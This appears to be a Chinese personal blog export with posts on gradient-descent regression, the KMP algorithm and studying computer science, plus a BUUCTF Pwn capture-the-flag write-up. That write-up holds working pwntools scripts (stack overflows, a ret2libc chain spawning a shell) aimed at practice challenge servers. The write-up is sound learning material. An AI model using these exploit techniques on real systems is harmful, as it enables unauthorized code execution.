class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">mse</span>(<span class="hljs-params">b, w, points</span>): <span class="hljs-comment"># 误差计算</span><br>    totalError=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(points)):<span class="hljs-comment">#循环迭代</span><br>        x=points[i, <span class="hljs-number">0</span>]<br>        y=points[i, <span class="hljs-number">1</span>]<br>        totalError+=(y-(w*x+b))**<span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> totalError/<span class="hljs-built_in">float</span>(<span class="hljs-built_in">len</span>(points))<span class="hljs-comment"># 求均方差</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stepdown_gradient</span>(<span class="hljs-params">b_current, w_current, points, lr</span>):<br>    b_gradient=<span class="hljs-number">0</span><br>    w_gradient=<span class="hljs-number">0</span><br>    M=<span class="hljs-built_in">float</span>(<span class="hljs-built_in">len</span>(points))<span class="hljs-comment">#样本总数</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(points)):<br>        x=points[i, <span class="hljs-number">0</span>]<br>        y=points[i, <span class="hljs-number">1</span>]<br>        b_gradient+=(<span class="hljs-number">2</span>/M)*((w_current * x + b_current) - y)<br>        w_gradient+=(<span class="hljs-number">2</span>/M)*x*((w_current*x + b_current)-y)<br>    new_b=b_current-(lr*b_gradient)<br>    new_w=w_current-(lr*w_gradient)<br>    <span class="hljs-keyword">return</span> [new_b,new_w]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gradient_descent</span>(<span class="hljs-params">points, starting_b, starting_w, lr, num_iterations</span>):<br>    b=starting_b<br>    w=starting_w<br><br>    <span class="hljs-keyword">for</span> step <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_iterations):<br>        b, w=stepdown_gradient(b, w, np.array(points), lr)<br>        loss=mse(b, w, points)<br>        <span class="hljs-keyword">if</span> step%<span class="hljs-number">50</span>==<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;iteration:<span class="hljs-subst">&#123;step&#125;</span>, loss:<span class="hljs-subst">&#123;loss&#125;</span>, w:<span class="hljs-subst">&#123;w&#125;</span>, b:<span class="hljs-subst">&#123;b&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> [b, w]<br><br><br>data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>    x=np.random.uniform(-<span class="hljs-number">10.</span>, <span class="hljs-number">10.</span>)<br>    eps=np.random.normal(<span class="hljs-number">0.</span>, <span class="hljs-number">0.01</span>)<br>    y=<span class="hljs-number">1.477</span>*x+<span class="hljs-number">0.089</span>+eps<br>    data.append([x,y])<br>data=np.array(data)<br>lr=<span class="hljs-number">0.01</span><br>initial_b=<span class="hljs-number">0</span><br>initial_w=<span class="hljs-number">0</span><br>num_iterations=<span class="hljs-number">1000</span><br>[b, w]=gradient_descent(data, initial_b, initial_w, lr, num_iterations)<br>loss=mse(b, w, data)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Fina loss:<span class="hljs-subst">&#123;loss&#125;</span>, w:<span class="hljs-subst">&#123;w&#125;</span>, b:<span class="hljs-subst">&#123;b&#125;</span>&#x27;</span>)<br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">iteration</span>:<span class="hljs-number">0</span>, loss:<span class="hljs-number">6</span>.<span class="hljs-number">162441874953508</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">0617677882731775</span>, b:-<span class="hljs-number">0</span>.<span class="hljs-number">014516689518537094</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">50</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">0017523594804364892</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4762089816223927</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">04897703734558919</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">100</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00033386053656463924</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4766149652009066</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">0747027092487452</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">150</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00014236473287524616</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4767641324874572</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08415488632085935</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">200</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011651300912947552</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">476818939825868</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08762782384952462</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">250</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">0001130230547401269</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">476839077246164</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08890385740094789</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">300</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">0001125519147202384</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">476846476176817</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08937270016328336</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">350</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011248831133360896</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4768491947064997</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08954496329503976</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">400</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247972494608194</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4768501935540335</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08960825655441457</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">450</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247856579317109</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">476850560552563</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08963151188851563</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">500</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247840930879765</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">476850695395886</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08964005640920385</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">550</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247838818357833</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4768507449402855</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08964319585383505</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">600</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247838533169705</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4768507631439864</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">0896443493547688</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">650</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247838494669628</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">476850769832426</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">0896447731763553</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">700</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247838489472176</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4768507722899058</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08964492889771788</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">750</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247838488770622</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4768507731928378</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08964498611316783</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">800</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247838488675786</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4768507735245948</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">0896450071353812</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">850</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247838488663068</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4768507736464898</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08964501485940428</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">900</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247838488661222</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4768507736912766</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08964501769738008</span><br><span class="hljs-attribute">iteration</span>:<span class="hljs-number">950</span>, loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247838488661079</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">476850773707732</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08964501874011474</span><br><span class="hljs-attribute">Fina</span> loss:<span class="hljs-number">0</span>.<span class="hljs-number">00011247838488660875</span>, w:<span class="hljs-number">1</span>.<span class="hljs-number">4768507737137073</span>, b:<span class="hljs-number">0</span>.<span class="hljs-number">08964501911873728</span><br></code></pre></td></tr></table></figure><p>所以，当迭代100次之后，w和b的值就已经比较接近真实模型了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构-KMP算法的研究</title>
      <link href="/2021/10/625e4078.html"/>
      <url>/2021/10/625e4078.html</url>
      
        <content type="html"><![CDATA[<h1 id="KMP是什么"><a href="#KMP是什么" class="headerlink" title="KMP是什么"></a>KMP是什么</h1><blockquote><p>在<a href="https://zh.wikipedia.org/wiki/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6">计算机科学</a>中，<strong>Knuth-Morris-Pratt<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%9F%A5%E6%89%BE%E7%AE%97%E6%B3%95">字符串查找算法</a><strong>（简称为</strong>KMP算法</strong>）可在一个<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a><code>S</code>内查找一个词<code>W</code>的出现位置。一个词在不匹配时本身就包含足够的信息来确定下一个匹配可能的开始位置，此算法利用这一特性以避免重新检查先前配对的<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E7%AC%A6">字符</a>。</p><p>这个算法由<a href="https://zh.wikipedia.org/wiki/%E9%AB%98%E5%BE%B7%E7%BA%B3">高德纳</a>和<a href="https://zh.wikipedia.org/w/index.php?title=%E6%B2%83%E6%81%A9%C2%B7%E6%99%AE%E6%8B%89%E7%89%B9&action=edit&redlink=1">沃恩·普拉特</a>在1974年构思，同年<a href="https://zh.wikipedia.org/w/index.php?title=%E8%A9%B9%E5%A7%86%E6%96%AF%C2%B7H%C2%B7%E8%8E%AB%E9%87%8C%E6%96%AF&action=edit&redlink=1">詹姆斯·H·莫里斯</a>也独立地设计出该算法，最终三人于1977年联合发表。</p><p>——wiki</p></blockquote><h1 id="KMP匹配的原理是什么"><a href="#KMP匹配的原理是什么" class="headerlink" title="KMP匹配的原理是什么"></a>KMP匹配的原理是什么</h1><p>在两个串匹配的过程中，当前一段匹配都相符合的时候，下一个元素匹配失败（两个串的指针分别到了i和j+1），这时候如果直接按照暴力做法返回到串头来重新进行匹配会增加时间复杂度，并未能利用到在两个指针前面一段已经匹配好的串。KMP的作用就是将最大的相同前缀后缀<strong>长度</strong>保存下来，以用来节省匹配时间，如果下一个元素匹配失败，那么可以将最大的相同前缀移到原来后缀的位置，那么相当于这一部分前缀就省去了匹配的过程，极大的降低了复杂度。</p><h1 id="next数组保存什么"><a href="#next数组保存什么" class="headerlink" title="next数组保存什么"></a>next数组保存什么</h1><p>next数组既可以理解为保存了当前下标下的相同最大前缀的最后一个元素的下标，也可以理解为保存了在当前下标之前的最大前后缀相同子串的长度，如图所示</p><p><img src="http://image.0error.net/202202101149737.png" alt="next数组作用图示"></p><h1 id="KMP模板"><a href="#KMP模板" class="headerlink" title="KMP模板"></a>KMP模板</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">100010</span>, M=<span class="hljs-number">1000010</span>;<br><br><span class="hljs-type">int</span> n,m;<br><span class="hljs-type">int</span> ne[N];<br><span class="hljs-type">char</span> s[M], p[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    cin&gt;&gt;n&gt;&gt;p+<span class="hljs-number">1</span>&gt;&gt;m&gt;&gt;s+<span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//KMP计算next</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>,j=<span class="hljs-number">0</span>;i&lt;=n;i++)<span class="hljs-comment">//next[1]无需计算，必为0</span><br>    &#123;<br>        <span class="hljs-keyword">while</span>(j &amp;&amp; p[i]!=p[j+<span class="hljs-number">1</span>])    j=ne[j];<br>        <span class="hljs-keyword">if</span>(p[i]==p[j+<span class="hljs-number">1</span>])    j++;<br>        ne[i]=j;<br>    &#125;<br>    <span class="hljs-comment">//KMP匹配</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>, j=<span class="hljs-number">0</span>;i&lt;=m;i++)<br>    &#123;<br>        <span class="hljs-keyword">while</span>(j &amp;&amp; s[i]!=p[j+<span class="hljs-number">1</span>])    j=ne[j];<br>        <span class="hljs-keyword">if</span>(s[i]==p[j+<span class="hljs-number">1</span>])    j++;<br>        <span class="hljs-keyword">if</span>(j==n)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, i-n);<br>            j=ne[j];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> KMP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些采访内容</title>
      <link href="/2021/10/7be08a10.html"/>
      <url>/2021/10/7be08a10.html</url>
      
        <content type="html"><![CDATA[<p>前面有以前的同学问过几个问题，我也按照我的理解尽己所能的予以了回答，所以在这里也记录一下，供读者和迷失自我时候的自己参考</p><blockquote><p>1.如果让你用三个词来描述自己的专业你会怎么说呢</p><p>2.很多人提到计算机专业都会提到“挣钱多”，对于这个说法你怎么看</p><p>3.计算机之类专业常被人调侃会秃头，你在学习中会感到吃力吗？有什么好的解决方法吗？</p><p>4.可以简单为我们介绍一些专业课吗</p><p>5.你想对报考这个专业的学弟学妹们说什么呢</p></blockquote><ol><li>第一个词：实干。计算机作为信息化时代造就的理科与工科并存的学科，给我最明显的感受就是实践出真知。计算机相关学科在实际的生产生活和学习实践中是最能把产学结合起来的学科，在这个行业有一句老话，是Linux 的发明人Linus 说的，叫做“talk is cheap, show me your code(废话少说，放码过来)”，学习计算机与学习其他学科最大的区别就在于你学习计算机一分钟，就可以有一分钟的产出，就可以写出一些新鲜好玩的东西。所以我们学习的时候更多的不看你怎么说，而是看你怎么做，这种技术为王的思想是这个学科一种很有效率的特征。<br>第二个词：逻辑。除了前面说到的工科的应用性，计算机还兼顾了理科很强的逻辑严谨性。计算机编程与我们平时说话不同，编程要求每一步执行都必须是严格的按照逻辑关系表达，每一次判断都要有明确的比较参数，每一个表达式都必须完整无误，甚至连大小写区分不清也会报错。所以计算机行业不论是从初学者还是到后来学习算法分析，程序分析设计，其实都是在学习逻辑的梳理。后来有理科思维的大牛把这些逻辑思维高度抽象后就形成了离散数学这门课，也属于计算机的专业课。包括眼下正是国家网络安全周，网络的安全维护其实也是去寻找代码里面的逻辑漏洞并加以修补，漏洞与逻辑相伴相生，有逻辑的地方肯定会有漏洞，这一点后面还会谈到。总而言之，计算机科学的学习过程就是一个对逻辑分析推理的学习过程。<br>第三个词：秩序。计算机学科和其他学科还有一个显著的区别就是计算机不论在硬件还是软件上都有着极其严谨的秩序，我在学习编程的时候更多的就是被其严谨的秩序感所吸引，每一个操作都有极为严谨的表达，上一个操作何时结束，下一个操作何时开始，全部都是由代码者预先设定好的逻辑（也许这就是为何计算机大佬学到巅峰之后都会相信有天命或者上帝存在的原因吧），而计算机的运行也非常“死板”，你是如何设定的，它就如何执行，一点不会多，一点也不会少，所以代码的时候如果出现bug，肯定是没有人第一时间会去怀疑是计算机出了问题的，所以说代码者在其自己所写代码的这个空间里也是“上帝”的身份吧，这个感觉很美妙。</li><li>这一点我认同，但是有前提条件。前一段时间人社部的北京市外来务工人口调查里面把从事信息软件服务类的人划分为“新时代农民工”，这个事情就很有意思。程序员一边被人以高工资羡慕，一边又被认定为新时代农名工，不知道大佬们对于此是如何想的，我的观点则是觉得程序员的高工资需要一个前提条件：有能力的程序员。前面提到我对计算机描述的三个词中第一个就是“实干”，对于一个真正的计算机专业的学生来说，计算机行业确实是一个最适合“屌丝逆袭”的领域，因为你会发现，互联网大厂的招聘有一个总的原则就是“英雄不问出身”，你的背景，家庭条件，现状，学历这些都不重要，大厂的招聘面试永远都是在问你的技术栈，在问你会什么，没有任何虚话空话，因为在这个互联网内容不断更新迭代的时代，互联网公司能考虑的只有一点：能否进入公司之后立刻上岗开始创造价值？如果这个问题你能回答是，那么恭喜你，你就成功被录取了。我们实验室一位现在就职于小米公司安全事业部的学长上周这么跟我讲：他们部门的主管是某高职院校毕业且专业是家具工程的网安大佬，他没有接受过科班培训，但是公司产品的安全只有他才能把关，其次和我们学长最初一起进入公司的有几名本科生和十几名研究生，但是最终留下来的比例却是本科生的最大，所以说在计算机领域，永远不看你说的，只看你做的，这是计算机适合逆袭的关键所在。但是拿到offer只是一小步，是否能够年薪几十万，还要看你的地位是否能够被取代，简单来说就是是否有一（几）项技术，只有你会做，别人都不会，如果你不在这一环节的生产就无法进行，那么恭喜你，你终于成为了别人嘴里的“高工资”程序员。到这就可以稳坐钓鱼台了吗？并不是。现在的互联网企业技术迭代基本每3-5年就要进行一次，在当前阶段你确实无法被取代，但是等3-5年以后公司整体技术框架变更后，也许你手里的技术就一夜之间一无是处了，这也就是新闻上经常谈到的程序员35岁退休的问题。所以说，高工资背后隐藏着的是高压力，不仅要在公司996，007，下班以后还要不断更新自己的技术栈，保证自己不会被时代所抛弃，也就是乔布斯说过的”Stay hungry, stay foolish(求知若渴，虚心若愚)”，如果这些你也能保证，那么恭喜你，解决了技术栈迭代和35岁退休的问题，现在你已经达到进入管理层的条件了，成为了一名真正的白领。</li><li>计算机行业确实容易被人调侃秃头，甚至我们还会拿发际线的高度来比较谁的“段位”比较高。但是实际上，我身边认识的大佬还都是很养生的，每天按时上下班，晚上十一点前就入睡，暂时还没有“秃头危机”，所以这方面也要提醒各位找公司接offer一定要提前打听好加班制度，毕竟身体才是革命的本钱…至于学习过程中遇到的困难，我最推崇的还是善用（Google, Github）搜索引擎，学会自学，大学里面教授的编程框架和思想都偏学术，相对于公司内部的开发工作和竞赛的场景而言，在课堂上学到的内容稍显古老，所以学会了课堂上所讲的，还要主动去学习课堂上讲不到的，主动学习，善于结合搜索引擎解决问题，总结下来还是乔布斯的那句话：Stay hungry, stay foolish.</li><li>专业课程主要应该就包含数据结构，算法分析，计算机组成，计算机网络，操作系统原理这些，但是这些都是偏向于底层理论学习，还是建议在力所能及的范围内多去了解课上学不到的时下新兴的知识，以求跟上技术迭代的步伐。在这里就介绍一下我所了解的：如果是对网络安全领域感兴趣，那么就有CTF竞赛，其有方向：Misc(杂项), Reverse(逆向工程), Pwn(主机安全), Web(web安全)， Crypto(密码学)，这些要做的也就是上文所提到的：在现有的系统里发现并（经过授权的合法）利用漏洞；如果是对算法或者数学分析推理感兴趣，那么可以去尝试一下算法竞赛（中学NOI，大学ACM），它有数论和图论等等一些细分的领域，如果有深造的打算，可以在本科阶段提前去了解一下机器学习的相关知识，为将来研究生阶段做准备；还有计算机图形学、工业物联网、深度学习…等等。顾名思义，这些内容都会涉及到一些不同的领域，计算机所涉及的领域其实很广且很深，我们只要能找到一个小方向把它研究明白，就是伟大胜利。</li><li>我想说的是计算机行业如果感兴趣学习起来会很有趣，不感兴趣的话会很痛苦，还是建议大家理性选择，如果是追求高工资或者认为计算机可以在游戏方面有所结合的这两类同学还是建议慎重报考，前者前文中也讲到了，高工资一般都是用几倍的幸苦换来的，而后者在这里就要明确告诉各位：计算机专业确实和游戏一点关系都没，游戏段位再高对计算机学习也没有什么实质性的帮助。但是如果你是真的热爱计算机&#x2F;编程&#x2F;算法&#x2F;网络安全&#x2F;人工智能，那确实是非常建议报考，而且计算机行业目前看来前景依旧很好，如果你喜欢少说多做行动派，那说明这个行业真的很适合你！如果学弟学妹有什么想了解的也欢迎继续向我咨询，随时尽己所能为大家答疑解惑。:)</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 记录 </tag>
            
            <tag> 感想 </tag>
            
            <tag> 访谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-Pwn</title>
      <link href="/2021/10/46d4a28d.html"/>
      <url>/2021/10/46d4a28d.html</url>
      
        <content type="html"><![CDATA[<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>根据IDA加载入main函数声明发现s数组距离<code>rbp</code>的距离为F，即为15，这里的运行环境是64位，所以应当将<code>Caller&#39;s rbp</code>的数据填满，在这里是8位，即可构造payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25401</span>)<br><span class="hljs-comment">#p=process(&quot;./pwn1&quot;)</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">15</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x401186</span>+<span class="hljs-number">1</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h2><p>打开IDA主函数两条命令，很明显可利用漏洞就在<code>vulnerable_function</code>函数内，进入后看到buf很明显距离rbp有0x80位，再加上64位机多出来的8位，即覆盖<code>0x80+0x8</code>即可覆盖，另外有<code>callsystem</code>函数作为漏洞执行入口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">27716</span>)<br><span class="hljs-comment">#p=process(&quot;./level0&quot;)</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">136</span>+p64(<span class="hljs-number">0x400596</span>)<br><span class="hljs-comment">#p.sendline(payload)</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Hello, World\n&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>首先获取程序的ROP信息<code>ROPgadget --binary ciscn_2019_c_1 --only &#39;pop|ret&#39;</code><br><img src="https://image.0error.net/img/202220220610191811.png" alt="ROPinfo"><br>后面的具体操作见代码注释</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">27706</span>)<br><span class="hljs-comment">#p=process(&quot;./ciscn_2019_c_1&quot;)</span><br>elf=ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>main=<span class="hljs-number">0x400b28</span><br>rdi=<span class="hljs-number">0x400c83</span><br>ret=<span class="hljs-number">0x4006b9</span><br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>p.sendlineafter(<span class="hljs-string">&#x27;Input your choice!\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<span class="hljs-comment">#构造以输出puts_got的内容</span><br>p.sendlineafter(<span class="hljs-string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>, payload)<br>p.recvline()<br>p.recvline()<br>puts_addr=u64(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<span class="hljs-comment">#得到puts函数的地址</span><br>libc=LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>libc_base=puts_addr-libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>sys_addr=libc_base+libc.dump(<span class="hljs-string">&quot;system&quot;</span>)<br>binsh=libc_base+libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>)<span class="hljs-comment">#使用LibcSearcher找到对应的libc版本号</span><br>p.sendlineafter(<span class="hljs-string">&#x27;choice!\n&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br><span class="hljs-comment">#由于Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐，在这里可以使用ret进行栈对齐</span><br>payload=<span class="hljs-string">b&#x27;\0&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x50</span>-<span class="hljs-number">1</span>+<span class="hljs-number">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys_addr)<br><span class="hljs-comment">#p.sendline(payload)</span><br>p.sendlineafter(<span class="hljs-string">&#x27;encrypted\n&#x27;</span>,payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>经过暴力循环测试法，测得最终的libc版本为<code>libc6_2.27-0ubuntu3_amd64</code>，然后即可打通本poc  </p><h2 id="第五空间2019-决赛-PWN5-格式化字符串"><a 